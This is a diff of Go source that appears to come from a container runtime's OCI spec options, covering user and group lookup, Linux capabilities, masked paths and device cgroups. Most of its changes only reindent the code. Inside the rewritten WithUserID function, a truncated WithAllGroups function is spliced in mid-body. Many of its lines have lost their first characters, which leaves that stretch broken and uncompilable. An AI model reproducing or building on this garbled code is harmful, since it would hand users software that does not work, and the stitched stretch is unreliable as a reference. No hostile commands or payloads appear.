{\n+                setProcess(s)\n+\n+                // For LCOW it's a bit harder to confirm that the user actually exists on the host as a rootfs isn't\n+                // mounted on the host and shared into the guest, but rather the rootfs is constructed entirely in the\n+                // guest itself. To accommodate this, a spot to place the user string provided by a client as-is is needed.\n+                // The `Username` field on the runtime spec is marked by Platform as only for Windows, and in this case it\n+                // *is* being set on a Windows host at least, but will be used as a temporary holding spot until the guest\n+                // can use the string to perform these same operations to grab the uid:gid inside.\n+                if s.Windows != nil && s.Linux != nil {\n+                        s.Process.User.Username = userstr\n+                        return nil\n+                }\n+\n+                parts := strings.Split(userstr, \":\")\n+                switch len(parts) {\n+                case 1:\n+                        v, err := strconv.Atoi(parts[0])\n+                        if err != nil {\n+                                // if we cannot parse as a uint they try to see if it is a username\n+                                return WithUsername(userstr)(ctx, client, c, s)\n+                        }\n+                        return WithUserID(uint32(v))(ctx, client, c, s)\n+                case 2:\n+                        var (\n+                                username  string\n+                                groupname string\n+                        )\n+                        var uid, gid uint32\n+                        v, err := strconv.Atoi(parts[0])\n+                        if err != nil {\n+                                username = parts[0]\n+                        } else {\n+                                uid = uint32(v)\n+                        }\n+                        if v, err = strconv.Atoi(parts[1]); err != nil {\n+                                groupname = parts[1]\n+                        } else {\n+                                gid = uint32(v)\n+                        }\n+                        if username == \"\" && groupname == \"\" {\n+                                s.Process.User.UID, s.Process.User.GID = uid, gid\n+                                return nil\n+                        }\n+                        f := func(root string) error {\n+                                if username != \"\" {\n+                                        user, err := UserFromPath(root, func(u user.User) bool {\n+                                                return u.Name == username\n+                                        })\n+                                        if err != nil {\n+                                                return err\n+                                        }\n+                                        s.Process.User.Username = username\n+                                }\n+                                if groupname != \"\" {\n+                                        gid, err = GIDFromPath(root, func(g user.Group) bool {\n+                                                return g.Name == groupname\n+                                        })\n+                                        if err != nil {\n+                                                return err\n+                                        }\n+                                }\n+                                s.Process.User.UID, s.Process.User.GID = uid, gid\n+                                return nil\n+                        }\n+                        if c.Snapshotter == \"\" && c.SnapshotKey == \"\" {\n+                                if !isRootfsAbs(s.Root.Path) {\n+                                        return errors.New(\"rootfs absolute path is required\")\n+                                }\n+                                return f(s.Root.Path)\n+                        }\n+                        if c.Snapshotter == \"\" {\n+                                return errors.New(\"no snapshotter set for container\")\n+                        }\n+                        if c.SnapshotKey == \"\" {\n+                                return errors.New(\"rootfs snapshot not created for container\")\n+                        }\n+                        snapshotter := client.SnapshotService(c.Snapshotter)\n+                        mounts, err := snapshotter.Mounts(ctx, c.SnapshotKey)\n+                        if err != nil {\n+                                return err\n+                        }\n+\n+                        mounts = tryReadonlyMounts(mounts)\n+                        return mount.WithTempMount(ctx, mounts, f)\n+                default:\n+                        return fmt.Errorf(\"invalid USER value %s\", userstr)\n+                }\n+        }\n }\n \n // WithUIDGID allows the UID and GID for the Process to be set\n func WithUIDGID(uid, gid uint32) SpecOpts {\n-\treturn func(_ context.Context, _ Client, _ *containers.Container, s *Spec) error {\n-\t\tsetProcess(s)\n-\t\ts.Process.User.UID = uid\n-\t\ts.Process.User.GID = gid\n-\t\treturn nil\n-\t}\n+        return func(_ context.Context, _ Client, _ *containers.Container, s *Spec) error {\n+                setProcess(s)\n+                s.Process.User.UID = uid\n+                s.Process.User.GID = gid\n+                return nil\n+        }\n }\n \n // WithUserID sets the correct UID and GID for the container based\n@@ -627,54 +1385,79 @@ func WithUIDGID(uid, gid uint32) SpecOpts {\n // or uid is not found in /etc/passwd, it sets the requested uid,\n // additionally sets the gid to 0, and does not return an error.\n func WithUserID(uid uint32) SpecOpts {\n-\treturn func(ctx context.Context, client Client, c *containers.Container, s *Spec) (err error) {\n-\t\tsetProcess(s)\n-\t\tif c.Snapshotter == \"\" && c.SnapshotKey == \"\" {\n-\t\t\tif !isRootfsAbs(s.Root.Path) {\n-\t\t\t\treturn errors.New(\"rootfs absolute path is required\")\n-\t\t\t}\n-\t\t\tuser, err := UserFromPath(s.Root.Path, func(u user.User) bool {\n-\t\t\t\treturn u.Uid == int(uid)\n-\t\t\t})\n-\t\t\tif err != nil {\n-\t\t\t\tif os.IsNotExist(err) || err == ErrNoUsersFound {\n-\t\t\t\t\ts.Process.User.UID, s.Process.User.GID = uid, 0\n-\t\t\t\t\treturn nil\n-\t\t\t\t}\n-\t\t\t\treturn err\n-\t\t\t}\n-\t\t\ts.Process.User.UID, s.Process.User.GID = uint32(user.Uid), uint32(user.Gid)\n-\t\t\treturn nil\n-\n-\t\t}\n-\t\tif c.Snapshotter == \"\" {\n-\t\t\treturn errors.New(\"no snapshotter set for container\")\n-\t\t}\n-\t\tif c.SnapshotKey == \"\" {\n-\t\t\treturn errors.New(\"rootfs snapshot not created for container\")\n-\t\t}\n-\t\tsnapshotter := client.SnapshotService(c.Snapshotter)\n-\t\tmounts, err := snapshotter.Mounts(ctx, c.SnapshotKey)\n-\t\tif err != nil {\n-\t\t\treturn err\n-\t\t}\n-\n-\t\tmounts = tryReadonlyMounts(mounts)\n-\t\treturn mount.WithTempMount(ctx, mounts, func(root string) error {\n-\t\t\tuser, err := UserFromPath(root, func(u user.User) bool {\n-\t\t\t\treturn u.Uid == int(uid)\n-\t\t\t})\n-\t\t\tif err != nil {\n-\t\t\t\tif os.IsNotExist(err) || err == ErrNoUsersFound {\n-\t\t\t\t\ts.Process.User.UID, s.Process.User.GID = uid, 0\n-\t\t\t\t\treturn nil\n-\t\t\t\t}\n-\t\t\t\treturn err\n-\t\t\t}\n-\t\t\ts.Process.User.UID, s.Process.User.GID = uint32(user.Uid), uint32(user.Gid)\n-\t\t\treturn nil\n-\t\t})\n-\t}\n+        return func(ctx context.Context, client Client, c *containers.Container, s *Spec) (err error) {\n+                setProcess(s)\n+                if c.Snapshotter == \"\" && c.SnapshotKey == \"\" {\n+                        if !isRootfsAbs(s.Root.Path) {\n+                                return errors.New(\"rootfs absolute path is required\")\n+                        }\n+                        user, err := UserFromPath(s.Root.Path, func(u user.User) bool {\n+                                return u.Uid == int(uid)\n+                        })\n+                        if err != nil {\n+                                if os.IsNotExist(err) || err == ErrNoUsersFound {\n+                                        s.Process.User.UID, s.Process.User.GID = uid, 0\n+                                        return nil\n+                                }\n+                                return err\n+                        }\n+                        s.Process.User.UID, s.Process.User.GID = uint32(user.Uid), uint32(user.Gid)\n+                        return nil\n+\n+                }\n+                if c.Snapshotter == \"\" {\n+                        return errors.New(\"no snapshotter set for container\")\n+                }\n+                if c.SnapshotKey == \"\" {\n+                        return errors.New(\"rootfs snapshot not created for container\")\n+                }\n+                snapshotter := client.SnapshotService(c.Snapshotter)\n+                mounts, err := snapshotter.Mounts(ctx, c.SnapshotKey)\n+                if err != nil {\n+                        return err\n+                }\n+\n+                mounts = tryReadonlyMounts(mounts)\n+func WithAllGroups() SpecOpts {\n+return func(ctx context.Context, client Client, c *containers.Container, s *Spec) error {\n+ame == \"\" {\n+ nil\n+c(root string) error {\n+lookupGIDs(root, s.Process.User.Username)\n+nil {\n+ err\n+alGids = append(s.Process.User.AdditionalGids, gids...)\n+ nil\n+apshotter == \"\" && c.SnapshotKey == \"\" {\n+ errors.New(\"rootfs absolute path is required\")\n+ f(s.Root.Path)\n+apshotter == \"\" {\n+ errors.New(\"no snapshotter set for container\")\n+apshotKey == \"\" {\n+ errors.New(\"rootfs snapshot not created for container\")\n+apshotter := client.SnapshotService(c.Snapshotter)\n+ts, err := snapshotter.Mounts(ctx, c.SnapshotKey)\n+nil {\n+ err\n+ mount.WithTempMount(ctx, mounts, f)\n+}\n+}\n+\n+                return mount.WithTempMount(ctx, mounts, func(root string) error {\n+                        user, err := UserFromPath(root, func(u user.User) bool {\n+                                return u.Uid == int(uid)\n+                        })\n+                        if err != nil {\n+                                if os.IsNotExist(err) || err == ErrNoUsersFound {\n+                                        s.Process.User.UID, s.Process.User.GID = uid, 0\n+                                        return nil\n+                                }\n+                                return err\n+                        }\n+                        s.Process.User.UID, s.Process.User.GID = uint32(user.Uid), uint32(user.Gid)\n+                        return nil\n+                })\n+        }\n }\n \n // WithUsername sets the correct UID and GID for the container\n@@ -684,204 +1467,204 @@ func WithUserID(uid uint32) SpecOpts {\n // the operating system will validate the user when going to run\n // the container.\n func WithUsername(username string) SpecOpts {\n-\treturn func(ctx context.Context, client Client, c *containers.Container, s *Spec) (err error) {\n-\t\tsetProcess(s)\n-\t\tif s.Linux != nil {\n-\t\t\tif c.Snapshotter == \"\" && c.SnapshotKey == \"\" {\n-\t\t\t\tif !isRootfsAbs(s.Root.Path) {\n-\t\t\t\t\treturn errors.New(\"rootfs absolute path is required\")\n-\t\t\t\t}\n-\t\t\t\tuser, err := UserFromPath(s.Root.Path, func(u user.User) bool {\n-\t\t\t\t\treturn u.Name == username\n-\t\t\t\t})\n-\t\t\t\tif err != nil {\n-\t\t\t\t\treturn err\n-\t\t\t\t}\n-\t\t\t\ts.Process.User.UID, s.Process.User.GID = uint32(user.Uid), uint32(user.Gid)\n-\t\t\t\treturn nil\n-\t\t\t}\n-\t\t\tif c.Snapshotter == \"\" {\n-\t\t\t\treturn errors.New(\"no snapshotter set for container\")\n-\t\t\t}\n-\t\t\tif c.SnapshotKey == \"\" {\n-\t\t\t\treturn errors.New(\"rootfs snapshot not created for container\")\n-\t\t\t}\n-\t\t\tsnapshotter := client.SnapshotService(c.Snapshotter)\n-\t\t\tmounts, err := snapshotter.Mounts(ctx, c.SnapshotKey)\n-\t\t\tif err != nil {\n-\t\t\t\treturn err\n-\t\t\t}\n-\n-\t\t\tmounts = tryReadonlyMounts(mounts)\n-\t\t\treturn mount.WithTempMount(ctx, mounts, func(root string) error {\n-\t\t\t\tuser, err := UserFromPath(root, func(u user.User) bool {\n-\t\t\t\t\treturn u.Name == username\n-\t\t\t\t})\n-\t\t\t\tif err != nil {\n-\t\t\t\t\treturn err\n-\t\t\t\t}\n-\t\t\t\ts.Process.User.UID, s.Process.User.GID = uint32(user.Uid), uint32(user.Gid)\n-\t\t\t\treturn nil\n-\t\t\t})\n-\t\t} else if s.Windows != nil {\n-\t\t\ts.Process.User.Username = username\n-\t\t} else {\n-\t\t\treturn errors.New(\"spec does not contain Linux or Windows section\")\n-\t\t}\n-\t\treturn nil\n-\t}\n+        return func(ctx context.Context, client Client, c *containers.Container, s *Spec) (err error) {\n+                setProcess(s)\n+                if s.Linux != nil {\n+                        if c.Snapshotter == \"\" && c.SnapshotKey == \"\" {\n+                                if !isRootfsAbs(s.Root.Path) {\n+                                        return errors.New(\"rootfs absolute path is required\")\n+                                }\n+                                user, err := UserFromPath(s.Root.Path, func(u user.User) bool {\n+                                        return u.Name == username\n+                                })\n+                                if err != nil {\n+                                        return err\n+                                }\n+                                s.Process.User.UID, s.Process.User.GID = uint32(user.Uid), uint32(user.Gid)\n+                                return nil\n+                        }\n+                        if c.Snapshotter == \"\" {\n+                                return errors.New(\"no snapshotter set for container\")\n+                        }\n+                        if c.SnapshotKey == \"\" {\n+                                return errors.New(\"rootfs snapshot not created for container\")\n+                        }\n+                        snapshotter := client.SnapshotService(c.Snapshotter)\n+                        mounts, err := snapshotter.Mounts(ctx, c.SnapshotKey)\n+                        if err != nil {\n+                                return err\n+                        }\n+\n+                        mounts = tryReadonlyMounts(mounts)\n+                        return mount.WithTempMount(ctx, mounts, func(root string) error {\n+                                user, err := UserFromPath(root, func(u user.User) bool {\n+                                        return u.Name == username\n+                                })\n+                                if err != nil {\n+                                        return err\n+                                }\n+                                s.Process.User.UID, s.Process.User.GID = uint32(user.Uid), uint32(user.Gid)\n+                                return nil\n+                        })\n+                } else if s.Windows != nil {\n+                        s.Process.User.Username = username\n+                } else {\n+                        return errors.New(\"spec does not contain Linux or Windows section\")\n+                }\n+                return nil\n+        }\n }\n \n // WithAdditionalGIDs sets the OCI spec's additionalGids array to any additional groups listed\n // for a particular user in the /etc/groups file of the image's root filesystem\n // The passed in user can be either a uid or a username.\n func WithAdditionalGIDs(userstr string) SpecOpts {\n-\treturn func(ctx context.Context, client Client, c *containers.Container, s *Spec) (err error) {\n-\t\t// For LCOW or on Darwin additional GID's not supported\n-\t\tif s.Windows != nil || runtime.GOOS == \"darwin\" {\n-\t\t\treturn nil\n-\t\t}\n-\t\tsetProcess(s)\n-\t\tsetAdditionalGids := func(root string) error {\n-\t\t\tvar username string\n-\t\t\tuid, err := strconv.Atoi(userstr)\n-\t\t\tif err == nil {\n-\t\t\t\tuser, err := UserFromPath(root, func(u user.User) bool {\n-\t\t\t\t\treturn u.Uid == uid\n-\t\t\t\t})\n-\t\t\t\tif err != nil {\n-\t\t\t\t\tif os.IsNotExist(err) || err == ErrNoUsersFound {\n-\t\t\t\t\t\treturn nil\n-\t\t\t\t\t}\n-\t\t\t\t\treturn err\n-\t\t\t\t}\n-\t\t\t\tusername = user.Name\n-\t\t\t} else {\n-\t\t\t\tusername = userstr\n-\t\t\t}\n-\t\t\tgids, err := getSupplementalGroupsFromPath(root, func(g user.Group) bool {\n-\t\t\t\t// we only want supplemental groups\n-\t\t\t\tif g.Name == username {\n-\t\t\t\t\treturn false\n-\t\t\t\t}\n-\t\t\t\tfor _, entry := range g.List {\n-\t\t\t\t\tif entry == username {\n-\t\t\t\t\t\treturn true\n-\t\t\t\t\t}\n-\t\t\t\t}\n-\t\t\t\treturn false\n-\t\t\t})\n-\t\t\tif err != nil {\n-\t\t\t\tif os.IsNotExist(err) {\n-\t\t\t\t\treturn nil\n-\t\t\t\t}\n-\t\t\t\treturn err\n-\t\t\t}\n-\t\t\ts.Process.User.AdditionalGids = gids\n-\t\t\treturn nil\n-\t\t}\n-\t\tif c.Snapshotter == \"\" && c.SnapshotKey == \"\" {\n-\t\t\tif !isRootfsAbs(s.Root.Path) {\n-\t\t\t\treturn errors.New(\"rootfs absolute path is required\")\n-\t\t\t}\n-\t\t\treturn setAdditionalGids(s.Root.Path)\n-\t\t}\n-\t\tif c.Snapshotter == \"\" {\n-\t\t\treturn errors.New(\"no snapshotter set for container\")\n-\t\t}\n-\t\tif c.SnapshotKey == \"\" {\n-\t\t\treturn errors.New(\"rootfs snapshot not created for container\")\n-\t\t}\n-\t\tsnapshotter := client.SnapshotService(c.Snapshotter)\n-\t\tmounts, err := snapshotter.Mounts(ctx, c.SnapshotKey)\n-\t\tif err != nil {\n-\t\t\treturn err\n-\t\t}\n-\n-\t\tmounts = tryReadonlyMounts(mounts)\n-\t\treturn mount.WithTempMount(ctx, mounts, setAdditionalGids)\n-\t}\n+        return func(ctx context.Context, client Client, c *containers.Container, s *Spec) (err error) {\n+                // For LCOW or on Darwin additional GID's not supported\n+                if s.Windows != nil || runtime.GOOS == \"darwin\" {\n+                        return nil\n+                }\n+                setProcess(s)\n+                setAdditionalGids := func(root string) error {\n+                        var username string\n+                        uid, err := strconv.Atoi(userstr)\n+                        if err == nil {\n+                                user, err := UserFromPath(root, func(u user.User) bool {\n+                                        return u.Uid == uid\n+                                })\n+                                if err != nil {\n+                                        if os.IsNotExist(err) || err == ErrNoUsersFound {\n+                                                return nil\n+                                        }\n+                                        return err\n+                                }\n+                                username = user.Name\n+                        } else {\n+                                username = userstr\n+                        }\n+                        gids, err := getSupplementalGroupsFromPath(root, func(g user.Group) bool {\n+                                // we only want supplemental groups\n+                                if g.Name == username {\n+                                        return false\n+                                }\n+                                for _, entry := range g.List {\n+                                        if entry == username {\n+                                                return true\n+                                        }\n+                                }\n+                                return false\n+                        })\n+                        if err != nil {\n+                                if os.IsNotExist(err) {\n+                                        return nil\n+                                }\n+                                return err\n+                        }\n+                        s.Process.User.AdditionalGids = gids\n+                        return nil\n+                }\n+                if c.Snapshotter == \"\" && c.SnapshotKey == \"\" {\n+                        if !isRootfsAbs(s.Root.Path) {\n+                                return errors.New(\"rootfs absolute path is required\")\n+                        }\n+                        return setAdditionalGids(s.Root.Path)\n+                }\n+                if c.Snapshotter == \"\" {\n+                        return errors.New(\"no snapshotter set for container\")\n+                }\n+                if c.SnapshotKey == \"\" {\n+                        return errors.New(\"rootfs snapshot not created for container\")\n+                }\n+                snapshotter := client.SnapshotService(c.Snapshotter)\n+                mounts, err := snapshotter.Mounts(ctx, c.SnapshotKey)\n+                if err != nil {\n+                        return err\n+                }\n+\n+                mounts = tryReadonlyMounts(mounts)\n+                return mount.WithTempMount(ctx, mounts, setAdditionalGids)\n+        }\n }\n \n // WithCapabilities sets Linux capabilities on the process\n func WithCapabilities(caps []string) SpecOpts {\n-\treturn func(_ context.Context, _ Client, _ *containers.Container, s *Spec) error {\n-\t\tsetCapabilities(s)\n+        return func(_ context.Context, _ Client, _ *containers.Container, s *Spec) error {\n+                setCapabilities(s)\n \n-\t\ts.Process.Capabilities.Bounding = caps\n-\t\ts.Process.Capabilities.Effective = caps\n-\t\ts.Process.Capabilities.Permitted = caps\n+                s.Process.Capabilities.Bounding = caps\n+                s.Process.Capabilities.Effective = caps\n+                s.Process.Capabilities.Permitted = caps\n \n-\t\treturn nil\n-\t}\n+                return nil\n+        }\n }\n \n func capsContain(caps []string, s string) bool {\n-\tfor _, c := range caps {\n-\t\tif c == s {\n-\t\t\treturn true\n-\t\t}\n-\t}\n-\treturn false\n+        for _, c := range caps {\n+                if c == s {\n+                        return true\n+                }\n+        }\n+        return false\n }\n \n func removeCap(caps *[]string, s string) {\n-\tvar newcaps []string\n-\tfor _, c := range *caps {\n-\t\tif c == s {\n-\t\t\tcontinue\n-\t\t}\n-\t\tnewcaps = append(newcaps, c)\n-\t}\n-\t*caps = newcaps\n+        var newcaps []string\n+        for _, c := range *caps {\n+                if c == s {\n+                        continue\n+                }\n+                newcaps = append(newcaps, c)\n+        }\n+        *caps = newcaps\n }\n \n // WithAddedCapabilities adds the provided capabilities\n func WithAddedCapabilities(caps []string) SpecOpts {\n-\treturn func(_ context.Context, _ Client, _ *containers.Container, s *Spec) error {\n-\t\tsetCapabilities(s)\n-\t\tfor _, c := range caps {\n-\t\t\tfor _, cl := range []*[]string{\n-\t\t\t\t&s.Process.Capabilities.Bounding,\n-\t\t\t\t&s.Process.Capabilities.Effective,\n-\t\t\t\t&s.Process.Capabilities.Permitted,\n-\t\t\t} {\n-\t\t\t\tif !capsContain(*cl, c) {\n-\t\t\t\t\t*cl = append(*cl, c)\n-\t\t\t\t}\n-\t\t\t}\n-\t\t}\n-\t\treturn nil\n-\t}\n+        return func(_ context.Context, _ Client, _ *containers.Container, s *Spec) error {\n+                setCapabilities(s)\n+                for _, c := range caps {\n+                        for _, cl := range []*[]string{\n+                                &s.Process.Capabilities.Bounding,\n+                                &s.Process.Capabilities.Effective,\n+                                &s.Process.Capabilities.Permitted,\n+                        } {\n+                                if !capsContain(*cl, c) {\n+                                        *cl = append(*cl, c)\n+                                }\n+                        }\n+                }\n+                return nil\n+        }\n }\n \n // WithDroppedCapabilities removes the provided capabilities\n func WithDroppedCapabilities(caps []string) SpecOpts {\n-\treturn func(_ context.Context, _ Client, _ *containers.Container, s *Spec) error {\n-\t\tsetCapabilities(s)\n-\t\tfor _, c := range caps {\n-\t\t\tfor _, cl := range []*[]string{\n-\t\t\t\t&s.Process.Capabilities.Bounding,\n-\t\t\t\t&s.Process.Capabilities.Effective,\n-\t\t\t\t&s.Process.Capabilities.Permitted,\n-\t\t\t} {\n-\t\t\t\tremoveCap(cl, c)\n-\t\t\t}\n-\t\t}\n-\t\treturn nil\n-\t}\n+        return func(_ context.Context, _ Client, _ *containers.Container, s *Spec) error {\n+                setCapabilities(s)\n+                for _, c := range caps {\n+                        for _, cl := range []*[]string{\n+                                &s.Process.Capabilities.Bounding,\n+                                &s.Process.Capabilities.Effective,\n+                                &s.Process.Capabilities.Permitted,\n+                        } {\n+                                removeCap(cl, c)\n+                        }\n+                }\n+                return nil\n+        }\n }\n \n // WithAmbientCapabilities set the Linux ambient capabilities for the process\n // Ambient capabilities should only be set for non-root users or the caller should\n // understand how these capabilities are used and set\n func WithAmbientCapabilities(caps []string) SpecOpts {\n-\treturn func(_ context.Context, _ Client, _ *containers.Container, s *Spec) error {\n-\t\tsetCapabilities(s)\n-\t\ts.Process.Capabilities.Inheritable = caps\n-\t\ts.Process.Capabilities.Ambient = caps\n-\t\treturn nil\n-\t}\n+        return func(_ context.Context, _ Client, _ *containers.Container, s *Spec) error {\n+                setCapabilities(s)\n+                s.Process.Capabilities.Inheritable = caps\n+                s.Process.Capabilities.Ambient = caps\n+                return nil\n+        }\n }\n \n // ErrNoUsersFound can be returned from UserFromPath\n@@ -890,18 +1673,18 @@ var ErrNoUsersFound = errors.New(\"no users found\")\n // UserFromPath inspects the user object using /etc/passwd in the specified rootfs.\n // filter can be nil.\n func UserFromPath(root string, filter func(user.User) bool) (user.User, error) {\n-\tppath, err := fs.RootPath(root, \"/etc/passwd\")\n-\tif err != nil {\n-\t\treturn user.User{}, err\n-\t}\n-\tusers, err := user.ParsePasswdFileFilter(ppath, filter)\n-\tif err != nil {\n-\t\treturn user.User{}, err\n-\t}\n-\tif len(users) == 0 {\n-\t\treturn user.User{}, ErrNoUsersFound\n-\t}\n-\treturn users[0], nil\n+        ppath, err := fs.RootPath(root, \"/etc/passwd\")\n+        if err != nil {\n+                return user.User{}, err\n+        }\n+        users, err := user.ParsePasswdFileFilter(ppath, filter)\n+        if err != nil {\n+                return user.User{}, err\n+        }\n+        if len(users) == 0 {\n+                return user.User{}, ErrNoUsersFound\n+        }\n+        return users[0], nil\n }\n \n // ErrNoGroupsFound can be returned from GIDFromPath\n@@ -910,249 +1693,249 @@ var ErrNoGroupsFound = errors.New(\"no groups found\")\n // GIDFromPath inspects the GID using /etc/passwd in the specified rootfs.\n // filter can be nil.\n func GIDFromPath(root string, filter func(user.Group) bool) (gid uint32, err error) {\n-\tgpath, err := fs.RootPath(root, \"/etc/group\")\n-\tif err != nil {\n-\t\treturn 0, err\n-\t}\n-\tgroups, err := user.ParseGroupFileFilter(gpath, filter)\n-\tif err != nil {\n-\t\treturn 0, err\n-\t}\n-\tif len(groups) == 0 {\n-\t\treturn 0, ErrNoGroupsFound\n-\t}\n-\tg := groups[0]\n-\treturn uint32(g.Gid), nil\n+        gpath, err := fs.RootPath(root, \"/etc/group\")\n+        if err != nil {\n+                return 0, err\n+        }\n+        groups, err := user.ParseGroupFileFilter(gpath, filter)\n+        if err != nil {\n+                return 0, err\n+        }\n+        if len(groups) == 0 {\n+                return 0, ErrNoGroupsFound\n+        }\n+        g := groups[0]\n+        return uint32(g.Gid), nil\n }\n \n func getSupplementalGroupsFromPath(root string, filter func(user.Group) bool) ([]uint32, error) {\n-\tgpath, err := fs.RootPath(root, \"/etc/group\")\n-\tif err != nil {\n-\t\treturn []uint32{}, err\n-\t}\n-\tgroups, err := user.ParseGroupFileFilter(gpath, filter)\n-\tif err != nil {\n-\t\treturn []uint32{}, err\n-\t}\n-\tif len(groups) == 0 {\n-\t\t// if there are no additional groups; just return an empty set\n-\t\treturn []uint32{}, nil\n-\t}\n-\taddlGids := []uint32{}\n-\tfor _, grp := range groups {\n-\t\taddlGids = append(addlGids, uint32(grp.Gid))\n-\t}\n-\treturn addlGids, nil\n+        gpath, err := fs.RootPath(root, \"/etc/group\")\n+        if err != nil {\n+                return []uint32{}, err\n+        }\n+        groups, err := user.ParseGroupFileFilter(gpath, filter)\n+        if err != nil {\n+                return []uint32{}, err\n+        }\n+        if len(groups) == 0 {\n+                // if there are no additional groups; just return an empty set\n+                return []uint32{}, nil\n+        }\n+        addlGids := []uint32{}\n+        for _, grp := range groups {\n+                addlGids = append(addlGids, uint32(grp.Gid))\n+        }\n+        return addlGids, nil\n }\n \n func isRootfsAbs(root string) bool {\n-\treturn filepath.IsAbs(root)\n+        return filepath.IsAbs(root)\n }\n \n // WithMaskedPaths sets the masked paths option\n func WithMaskedPaths(paths []string) SpecOpts {\n-\treturn func(_ context.Context, _ Client, _ *containers.Container, s *Spec) error {\n-\t\tsetLinux(s)\n-\t\ts.Linux.MaskedPaths = paths\n-\t\treturn nil\n-\t}\n+        return func(_ context.Context, _ Client, _ *containers.Container, s *Spec) error {\n+                setLinux(s)\n+                s.Linux.MaskedPaths = paths\n+                return nil\n+        }\n }\n \n // WithReadonlyPaths sets the read only paths option\n func WithReadonlyPaths(paths []string) SpecOpts {\n-\treturn func(_ context.Context, _ Client, _ *containers.Container, s *Spec) error {\n-\t\tsetLinux(s)\n-\t\ts.Linux.ReadonlyPaths = paths\n-\t\treturn nil\n-\t}\n+        return func(_ context.Context, _ Client, _ *containers.Container, s *Spec) error {\n+                setLinux(s)\n+                s.Linux.ReadonlyPaths = paths\n+                return nil\n+        }\n }\n \n // WithWriteableSysfs makes any sysfs mounts writeable\n func WithWriteableSysfs(_ context.Context, _ Client, _ *containers.Container, s *Spec) error {\n-\tfor _, m := range s.Mounts {\n-\t\tif m.Type == \"sysfs\" {\n-\t\t\tfor i, o := range m.Options {\n-\t\t\t\tif o == \"ro\" {\n-\t\t\t\t\tm.Options[i] = \"rw\"\n-\t\t\t\t}\n-\t\t\t}\n-\t\t}\n-\t}\n-\treturn nil\n+        for _, m := range s.Mounts {\n+                if m.Type == \"sysfs\" {\n+                        for i, o := range m.Options {\n+                                if o == \"ro\" {\n+                                        m.Options[i] = \"rw\"\n+                                }\n+                        }\n+                }\n+        }\n+        return nil\n }\n \n // WithWriteableCgroupfs makes any cgroup mounts writeable\n func WithWriteableCgroupfs(_ context.Context, _ Client, _ *containers.Container, s *Spec) error {\n-\tfor _, m := range s.Mounts {\n-\t\tif m.Type == \"cgroup\" {\n-\t\t\tfor i, o := range m.Options {\n-\t\t\t\tif o == \"ro\" {\n-\t\t\t\t\tm.Options[i] = \"rw\"\n-\t\t\t\t}\n-\t\t\t}\n-\t\t}\n-\t}\n-\treturn nil\n+        for _, m := range s.Mounts {\n+                if m.Type == \"cgroup\" {\n+                        for i, o := range m.Options {\n+                                if o == \"ro\" {\n+                                        m.Options[i] = \"rw\"\n+                                }\n+                        }\n+                }\n+        }\n+        return nil\n }\n \n // WithSelinuxLabel sets the process SELinux label\n func WithSelinuxLabel(label string) SpecOpts {\n-\treturn func(_ context.Context, _ Client, _ *containers.Container, s *Spec) error {\n-\t\tsetProcess(s)\n-\t\ts.Process.SelinuxLabel = label\n-\t\treturn nil\n-\t}\n+        return func(_ context.Context, _ Client, _ *containers.Container, s *Spec) error {\n+                setProcess(s)\n+                s.Process.SelinuxLabel = label\n+                return nil\n+        }\n }\n \n // WithApparmorProfile sets the Apparmor profile for the process\n func WithApparmorProfile(profile string) SpecOpts {\n-\treturn func(_ context.Context, _ Client, _ *containers.Container, s *Spec) error {\n-\t\tsetProcess(s)\n-\t\ts.Process.ApparmorProfile = profile\n-\t\treturn nil\n-\t}\n+        return func(_ context.Context, _ Client, _ *containers.Container, s *Spec) error {\n+                setProcess(s)\n+                s.Process.ApparmorProfile = profile\n+                return nil\n+        }\n }\n \n // WithSeccompUnconfined clears the seccomp profile\n func WithSeccompUnconfined(_ context.Context, _ Client, _ *containers.Container, s *Spec) error {\n-\tsetLinux(s)\n-\ts.Linux.Seccomp = nil\n-\treturn nil\n+        setLinux(s)\n+        s.Linux.Seccomp = nil\n+        return nil\n }\n \n // WithParentCgroupDevices uses the default cgroup setup to inherit the container's parent cgroup's\n // allowed and denied devices\n func WithParentCgroupDevices(_ context.Context, _ Client, _ *containers.Container, s *Spec) error {\n-\tsetLinux(s)\n-\tif s.Linux.Resources == nil {\n-\t\ts.Linux.Resources = &specs.LinuxResources{}\n-\t}\n-\ts.Linux.Resources.Devices = nil\n-\treturn nil\n+        setLinux(s)\n+        if s.Linux.Resources == nil {\n+                s.Linux.Resources = &specs.LinuxResources{}\n+        }\n+        s.Linux.Resources.Devices = nil\n+        return nil\n }\n \n // WithAllDevicesAllowed permits READ WRITE MKNOD on all devices nodes for the container\n func WithAllDevicesAllowed(_ context.Context, _ Client, _ *containers.Container, s *Spec) error {\n-\tsetLinux(s)\n-\tif s.Linux.Resources == nil {\n-\t\ts.Linux.Resources = &specs.LinuxResources{}\n-\t}\n-\ts.Linux.Resources.Devices = []specs.LinuxDeviceCgroup{\n-\t\t{\n-\t\t\tAllow:  true,\n-\t\t\tAccess: rwm,\n-\t\t},\n-\t}\n-\treturn nil\n+        setLinux(s)\n+        if s.Linux.Resources == nil {\n+                s.Linux.Resources = &specs.LinuxResources{}\n+        }\n+        s.Linux.Resources.Devices = []specs.LinuxDeviceCgroup{\n+                {\n+                        Allow:  true,\n+                        Access: rwm,\n+                },\n+        }\n+        return nil\n }\n \n // WithDefaultUnixDevices adds the default devices for unix such as /dev/null, /dev/random to\n // the container's resource cgroup spec\n func WithDefaultUnixDevices(_ context.Context, _ Client, _ *containers.Container, s *Spec) error {\n-\tsetLinux(s)\n-\tif s.Linux.Resources == nil {\n-\t\ts.Linux.Resources = &specs.LinuxResources{}\n-\t}\n-\tintptr := func(i int64) *int64 {\n-\t\treturn &i\n-\t}\n-\ts.Linux.Resources.Devices = append(s.Linux.Resources.Devices, []specs.LinuxDeviceCgroup{\n-\t\t{\n-\t\t\t// \"/dev/null\",\n-\t\t\tType:   \"c\",\n-\t\t\tMajor:  intptr(1),\n-\t\t\tMinor:  intptr(3),\n-\t\t\tAccess: rwm,\n-\t\t\tAllow:  true,\n-\t\t},\n-\t\t{\n-\t\t\t// \"/dev/random\",\n-\t\t\tType:   \"c\",\n-\t\t\tMajor:  intptr(1),\n-\t\t\tMinor:  intptr(8),\n-\t\t\tAccess: rwm,\n-\t\t\tAllow:  true,\n-\t\t},\n-\t\t{\n-\t\t\t// \"/dev/full\",\n-\t\t\tType:   \"c\",\n-\t\t\tMajor:  intptr(1),\n-\t\t\tMinor:  intptr(7),\n-\t\t\tAccess: rwm,\n-\t\t\tAllow:  true,\n-\t\t},\n-\t\t{\n-\t\t\t// \"/dev/tty\",\n-\t\t\tType:   \"c\",\n-\t\t\tMajor:  